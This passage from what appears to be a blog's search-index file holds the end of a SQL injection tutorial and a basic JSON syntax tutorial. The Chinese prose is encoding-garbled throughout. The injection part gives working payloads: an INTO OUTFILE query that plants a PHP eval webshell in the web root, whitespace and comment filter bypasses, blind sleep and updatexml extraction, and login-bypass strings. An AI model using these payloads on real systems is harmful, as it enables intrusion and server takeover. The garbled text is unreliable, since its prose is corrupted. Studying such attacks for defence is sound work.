æ³•å†™å…¥ä»»ä½•æ–‡ä»¶ï¼Œå€¼ä¸ºæŸä¸ªè·¯å¾„æ—¶å€™åªèƒ½å¾€è¯¥è·¯å¾„å†™å…¥</span>  æŸ¥è¯¢ï¼šshow variables like %secure%  è®¾ç½®ï¼šset global <span class="token assign-left variable">secure_file_priv</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token number">5.6</span>ä»¥ä¸‹å¯ä»¥ï¼Œä»¥ä¸Šè¦åˆ°my.iniæ–‡ä»¶ä¸­æ‰‹åŠ¨ä¿®æ”¹<span class="token punctuation">)</span><span class="token number">2</span>.å½“å‰æ•°æ®åº“ç”¨æˆ·æœ‰è¯»å†™æ–‡ä»¶çš„æƒé™<span class="token number">3</span>.çŸ¥é“æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ã€‚å†™æ³•ï¼šUNION SELECT <span class="token number">1,2</span>,3,4,5,6,7,8,9,10,<span class="token string">"&lt;?php @eval(<span class="token variable">$_REQUEST</span>['a']);?&gt;"</span>,12,13 into outfile <span class="token string">"/var/www/html/aaa.php"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3ï¼‰SQLæ³¨å…¥ç»•è¿‡"><a href="#3ï¼‰SQLæ³¨å…¥ç»•è¿‡" class="headerlink" title="3ï¼‰SQLæ³¨å…¥ç»•è¿‡"></a>3ï¼‰SQLæ³¨å…¥ç»•è¿‡</h2><ul><li>ç©ºæ ¼ç»•è¿‡ï¼š</li></ul><p>ä½¿ç”¨ /**/ç»•è¿‡è¿‡æ»¤ç©ºæ ¼ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token number">1</span>'/**/AND/**/1<span class="token operator">=</span><span class="token number">1</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¬å·æˆ–||ç»•è¿‡</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token punctuation">(</span>sleep<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>mid<span class="token punctuation">(</span>user<span class="token punctuation">(</span><span class="token punctuation">)</span>from<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>for<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">))</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">109</span><span class="token punctuation">))</span><span class="token number">1</span><span class="token string">'||updatexml(1,concat(0x7e,version()),1)||'</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç‰¹æ®Šå­—ç¬¦ä»£æ›¿</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">%09 TABé”®ï¼ˆæ°´å¹³ï¼‰ %0a æ–°å»ºä¸€è¡Œ %0c æ–°çš„ä¸€é¡µ %0d returnåŠŸèƒ½ %0b TABé”®ï¼ˆå‚ç›´ï¼‰ %a0 ç©ºæ ¼<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>æ³¨é‡Šç»•è¿‡</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">--ç©ºæ ¼ --ç©ºæ ¼a <span class="token comment"># </span>/**/ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>é—­åˆç»•è¿‡</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token number">1</span><span class="token string">' and '</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>æ°¸çœŸç»•è¿‡</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sleep<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4ï¼‰ä¸‡èƒ½å¯†ç "><a href="#4ï¼‰ä¸‡èƒ½å¯†ç " class="headerlink" title="4ï¼‰ä¸‡èƒ½å¯†ç "></a>4ï¼‰ä¸‡èƒ½å¯†ç </h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token string">' or '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span><span class="token string">' or 1=1 #1'</span><span class="token operator">||</span><span class="token string">'11'</span><span class="token operator">||</span><span class="token number">1</span><span class="token comment">#</span><span class="token string">'='</span><span class="token string">'-'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æœ¬æ–‡ä¸»è¦è¾ƒä¸ºå…¨é¢çš„è®²è§£webå®‰å…¨é¢†åŸŸçš„sqlæ³¨å…¥æ”»å‡»ï¼ŒSQLæ³¨å…¥æ”»å‡»æ˜¯ä¸€ç§å¸¸è§çš„ç½‘ç»œæ”»å‡»æ‰‹æ®µï¼Œæ”»å‡»è€…é€šè¿‡åœ¨Webåº”ç”¨ç¨‹åºçš„è¾“å…¥å­—æ®µä¸­æ’å…¥æ¶æ„SQLä»£ç ï¼Œè¯•å›¾æ¬ºéª—æœåŠ¡å™¨æ‰§è¡Œéæˆæƒçš„æ•°æ®åº“å‘½ä»¤ï¼Œä»è€Œè·å–ã€ä¿®æ”¹æˆ–åˆ é™¤æ•°æ®åº“ä¸­çš„æ•°æ®ã€‚è¿™ç§æ”»å‡»åˆ©ç”¨äº†åº”ç”¨ç¨‹åºå¯¹ç”¨æˆ·è¾“å…¥éªŒè¯ä¸è¶³çš„æ¼æ´ï¼Œå¯èƒ½å¯¼è‡´ä¸¥é‡çš„æ•°æ®æ³„éœ²æˆ–ç³»ç»ŸæŸåã€‚</p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
            <tag> æ¼æ´çŸ¥è¯†åº“ </tag>
            
            <tag> sqlæ³¨å…¥åŸºç¡€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è½»é‡çº§çš„æ•°æ®äº¤æ¢æ ¼å¼JSON</title>
      <link href="/2022/01/09/qian-hou-duan-kai-fa/qing-liang-ji-de-shu-ju-jiao-huan-ge-shi-json/"/>
      <url>/2022/01/09/qian-hou-duan-kai-fa/qing-liang-ji-de-shu-ju-jiao-huan-ge-shi-json/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€jsonç®€ä»‹"><a href="#ä¸€ã€jsonç®€ä»‹" class="headerlink" title="ä¸€ã€jsonç®€ä»‹"></a>ä¸€ã€jsonç®€ä»‹</h1><p>JSONï¼ˆJavaScript Object Notationï¼‰æ˜¯ä¸€ç§è½»é‡çº§çš„æ•°æ®äº¤æ¢æ ¼å¼ï¼Œæ˜“äºäººé˜…è¯»å’Œç¼–å†™ï¼ŒåŒæ—¶ä¹Ÿæ˜“äºæœºå™¨è§£æå’Œç”Ÿæˆã€‚å®ƒåŸºäºJavaScriptçš„ä¸€ä¸ªå­é›†ï¼Œä½†å·²ç»æˆä¸ºä¸€ç§ç‹¬ç«‹çš„æ ¼å¼ï¼Œå¹¿æ³›ç”¨äºå„ç§ç¼–ç¨‹è¯­è¨€ä¸­ï¼Œç”¨äºæ•°æ®çš„è¡¨ç¤ºå’Œäº¤æ¢ã€‚</p><h1 id="äºŒã€jsonè¯­æ³•"><a href="#äºŒã€jsonè¯­æ³•" class="headerlink" title="äºŒã€jsonè¯­æ³•"></a>äºŒã€jsonè¯­æ³•</h1><p>JSON è¯­æ³•æ˜¯ JavaScript è¯­æ³•çš„å­é›†ã€‚</p><h2 id="2-1-JSON-çš„åŸºæœ¬è¯­æ³•"><a href="#2-1-JSON-çš„åŸºæœ¬è¯­æ³•" class="headerlink" title="2.1 JSON çš„åŸºæœ¬è¯­æ³•"></a>2.1 JSON çš„åŸºæœ¬è¯­æ³•</h2><ul><li>æ•°æ®åœ¨<strong>åç§°/å€¼</strong>å¯¹ä¸­</li><li>æ•°æ®ç”±é€—å· <strong>,</strong> åˆ†éš”</li><li>ä½¿ç”¨æ–œæ† *<em>*</em> æ¥è½¬ä¹‰å­—ç¬¦</li><li>å¤§æ‹¬å· <strong>{}</strong> ä¿å­˜å¯¹è±¡</li><li>ä¸­æ‹¬å· <strong>[]</strong> ä¿å­˜æ•°ç»„ï¼Œæ•°ç»„å¯ä»¥åŒ…å«å¤šä¸ªå¯¹è±¡</li></ul><h2 id="2-2-JSON-çš„ä¸¤ç§ç»“æ„"><a href="#2-2-JSON-çš„ä¸¤ç§ç»“æ„" class="headerlink" title="2.2 JSON çš„ä¸¤ç§ç»“æ„"></a>2.2 <strong>JSON çš„ä¸¤ç§ç»“æ„</strong></h2><h3 id="2-1-1-å¯¹è±¡ï¼ˆObjectï¼‰"><a href="#2-1-1-å¯¹è±¡ï¼ˆObjectï¼‰" class="headerlink" title="2.1.1 å¯¹è±¡ï¼ˆObjectï¼‰"></a>2.1.1 <strong>å¯¹è±¡ï¼ˆObjectï¼‰</strong></h3><p>ä¸€ç»„é”®å€¼å¯¹çš„é›†åˆï¼Œç”¨å¤§æ‹¬å· <code>{}</code> åŒ…å›´ã€‚é”®ï¼ˆkeyï¼‰å¿…é¡»æ˜¯å­—ç¬¦ä¸²ï¼Œå€¼ï¼ˆvalueï¼‰å¯ä»¥æ˜¯å­—ç¬¦ä¸²ã€æ•°å­—ã€å¸ƒå°”å€¼ã€æ•°ç»„ã€å¯¹è±¡æˆ–nullã€‚</p><h3 id="2-1-2-æ•°ç»„ï¼ˆArrayï¼‰"><a href="#2-1-2-æ•°ç»„ï¼ˆArrayï¼‰" class="headerlink" title="2.1.2 æ•°ç»„ï¼ˆArrayï¼‰"></a>2.1.2 <strong>æ•°ç»„ï¼ˆArrayï¼‰</strong></h3><p>ä¸€ç»„æœ‰åºçš„å€¼çš„é›†åˆï¼Œç”¨æ–¹æ‹¬å· <code>[]</code> åŒ…å›´ã€‚æ•°ç»„ä¸­çš„å…ƒç´ å¯ä»¥æ˜¯ä»»æ„ç±»å‹çš„æ•°æ®ã€‚</p><p>ä¸­æ‹¬å· <strong>[]</strong> ä¿å­˜çš„æ•°ç»„æ˜¯å€¼ï¼ˆvalueï¼‰çš„æœ‰åºé›†åˆã€‚ä¸€ä¸ªæ•°ç»„ä»¥å·¦ä¸­æ‹¬å· <strong>[</strong> å¼€å§‹ï¼Œ å³ä¸­æ‹¬å· <strong>]</strong> ç»“æŸï¼Œå€¼ä¹‹é—´ä½¿ç”¨é€—å· <strong>,</strong> åˆ†éš”ã€‚</p><p>å€¼ï¼ˆvalueï¼‰å¯ä»¥æ˜¯åŒå¼•å·æ‹¬èµ·æ¥çš„å­—ç¬¦ä¸²ï¼ˆstringï¼‰ã€æ•°å€¼(number)ã€trueã€falseã€ nullã€å¯¹è±¡ï¼ˆobjectï¼‰æˆ–è€…æ•°ç»„ï¼ˆarrayï¼‰ï¼Œå®ƒä»¬æ˜¯å¯ä»¥åµŒå¥—çš„ã€‚</p><h2 id="2-3-JSON-åç§°-å€¼å¯¹"><a href="#2-3-JSON-åç§°-å€¼å¯¹" class="headerlink" title="2.3 JSON åç§°/å€¼å¯¹"></a>2.3 JSON åç§°/å€¼å¯¹</h2><p>JSON æ•°æ®çš„ä¹¦å†™æ ¼å¼æ˜¯ï¼š</p><pre class="line-numbers language-json" data-language="json"><code class="language-json">key <span class="token operator">:</span> value<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é”®ï¼ˆåœ¨åŒå¼•å·ä¸­ï¼‰ï¼Œåé¢å†™ä¸€ä¸ªå†’å·ï¼Œç„¶åæ˜¯å€¼ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token string">"name"</span> <span class="token builtin class-name">:</span> <span class="token string">"sxk"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™å¾ˆå®¹æ˜“ç†è§£ï¼Œç­‰ä»·äºè¿™æ¡ JavaScript è¯­å¥ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">name <span class="token operator">=</span> <span class="token string">"sxk"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-4-JSON-å€¼"><a href="#2-4-JSON-å€¼" class="headerlink" title="2.4 JSON å€¼"></a>2.4 JSON å€¼</h2><ul><li><strong>å­—ç¬¦ä¸²ï¼ˆStringï¼‰</strong>ï¼šç”¨åŒå¼•å· <code>""</code> åŒ…å›´çš„æ–‡æœ¬æ•°æ®ã€‚å•å¼•å· <code>''</code> ä¸æ˜¯æœ‰æ•ˆçš„JSONå­—ç¬¦ä¸²ã€‚ã€âš ï¸ã€‘</li><li><strong>æ•°å­—ï¼ˆNumberï¼‰</strong>ï¼šå¯ä»¥æ˜¯æ•´æ•°æˆ–æµ®ç‚¹æ•°ï¼Œå¯ä»¥ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•è¡¨ç¤ºã€‚</li><li><strong>å¸ƒå°”å€¼ï¼ˆBooleanï¼‰</strong>ï¼šåªæœ‰ä¸¤ä¸ªå€¼ï¼š<code>true</code> å’Œ <code>false</code>ï¼Œæ³¨æ„å¤§å°å†™ã€‚</li><li><strong>æ•°ç»„ï¼ˆArrayï¼‰</strong>ï¼šç”¨æ–¹æ‹¬å· <code>[]</code> åŒ…å›´çš„æœ‰åºå€¼é›†åˆã€‚</li><li><strong>å¯¹è±¡ï¼ˆObjectï¼‰</strong>ï¼šç”¨å¤§æ‹¬å· <code>{}</code> åŒ…å›´çš„é”®å€¼å¯¹é›†åˆã€‚</li><li><strong>null</strong>ï¼šè¡¨ç¤ºç©ºå€¼æˆ–ä¸å­˜åœ¨çš„å€¼ã€‚</li></ul><p>è¯­æ³•è¦ç‚¹ï¼š</p><h2 id="è¯­æ³•è¦ç‚¹"><a href="#è¯­æ³•è¦ç‚¹" class="headerlink" title="è¯­æ³•è¦ç‚¹"></a>è¯­æ³•è¦ç‚¹</h2><ul><li><strong>é”®å¿…é¡»æ˜¯å­—ç¬¦ä¸²</strong>ï¼šå³ä½¿é”®çœ‹èµ·æ¥åƒæ˜¯æ•°å­—æˆ–å¸ƒå°”å€¼ï¼Œä¹Ÿå¿…é¡»ç”¨åŒå¼•å·åŒ…å›´ã€‚ã€âš ï¸ã€‘</li><li><strong>å€¼å¯ä»¥æ˜¯ä»»æ„ç±»å‹</strong>ï¼šåŒ…æ‹¬å­—ç¬¦ä¸²ã€æ•°å­—ã€å¸ƒå°”å€¼ã€æ•°ç»„ã€å¯¹è±¡æˆ–nullã€‚</li><li><strong>é€—å·åˆ†éš”</strong>ï¼šå¯¹è±¡ä¸­çš„é”®å€¼å¯¹æˆ–æ•°ç»„ä¸­çš„å…ƒç´ ä¹‹é—´ç”¨é€—å· <code>,</code> åˆ†éš”ã€‚</li><li><strong>ä¸å…è®¸æ³¨é‡Š</strong>ï¼šJSONæ ¼å¼ä¸æ”¯æŒæ³¨é‡Šï¼Œè¿™ä¸JavaScriptä¸åŒã€‚</li></ul>]]></content>
      
      
      <categories>
          
          <category> å‰åç«¯å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JSON </tag>
            
            <tag> å‰åç«¯æ•°æ®äº¤æ¢ </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
